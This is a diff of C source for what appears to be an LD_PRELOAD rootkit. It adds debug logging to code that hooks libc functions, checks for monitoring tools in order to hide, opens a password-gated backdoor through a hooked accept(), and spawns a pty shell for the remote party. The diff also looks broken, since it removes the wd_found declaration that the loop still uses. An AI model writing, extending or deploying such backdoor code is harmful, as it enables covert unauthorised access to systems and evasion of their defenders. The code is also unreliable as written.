@@ -27,6 +27,12 @@
 #include "config.h"
 #include "libcalls.h"
 
+#ifdef DEBUG
+    #define debug(fmt, ...) fprintf(stderr, fmt, ##__VA_ARGS__)
+#else
+    #define debug(fmt, ...) /* Not debugging. */
+#endif
+
 /* Non-hooks: */
 void init(void) __attribute__((constructor));
 void fini(void) __attribute__((destructor));
@@ -39,7 +45,6 @@ void init(void)
     FILE *handle;
     char *caller = NULL;
     size_t len = 0;
-    bool wd_found = false;
 
     const char *libc_names[] = \
     {
@@ -53,11 +58,8 @@ void init(void)
     {
         while(getdelim(&caller, &len, 0, handle) != -1 && !wd_found)
         {
-            if((wd_found = watchdog(caller)))
-            {
-                puts("Watchdog found!\n");
+            if(watchdog(caller))
                 // Unload the library.
-            }
         }
 
         free(caller);
@@ -67,11 +69,14 @@ void init(void)
     /* Initialise: pointers to libc functions. */
     for(i = 0; i < N_LIBCALLS; i++)
         libcalls[i] = dlsym(RTLD_NEXT, libc_names[i]);
+
+    debug("init() done.\n");
 }
 
 void fini(void)
 {
     // Cleanup.
+    debug("fini() done.\n");
 }
 
 void drop_shell(int fd)
@@ -82,6 +87,7 @@ void drop_shell(int fd)
     char pty_name[13];    // /proc/sys/kernel/pty/max generally <= 4 chars.
     char *test = "echo 123 > /tmp/456.txt\n";
 
+	debug("drop_shell(): forkpty() called.\n");
     pid = forkpty(&master, pty_name, NULL, NULL);
 
     dprintf(fd, "Master FD: %d\n", master);
@@ -94,6 +100,7 @@ void drop_shell(int fd)
         // dup2(master, STDOUT_FILENO);
         // dup2(master, STDERR_FILENO);
 
+    	debug("drop_shell(): dropping shell.\n");
         execv(argv[0], argv);
     }
     else if(pid > 0)
@@ -121,6 +128,8 @@ void drop_shell(int fd)
 
     close(master);
 //    close(slave);
+
+    debug("drop_shell() done.\n");
 }
 
 int watchdog(char *name)
@@ -136,10 +145,15 @@ int watchdog(char *name)
     wd_size = sizeof watchdogs / sizeof watchdogs[0];
 
     for(i = 0; i < wd_size; i++)
+    {
         if(strcmp(watchdogs[i], name) == 0)
-            return 1;
+        {
+        	debug("watchdog(): busted (%s).\n", name);
+            return true;
+        }
+    }
 
-    return 0;
+    return false;
 }
 
 /* PAM hooks: */
@@ -190,6 +204,7 @@ int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
 
     if(port >= LOW_PORT && port <= HIGH_PORT)
     {
+    	debug("accept(): ready for password: ");
         read(retfd, password, pass_len);
 
         if(strcmp(password, SHELL_PASS) == 0)
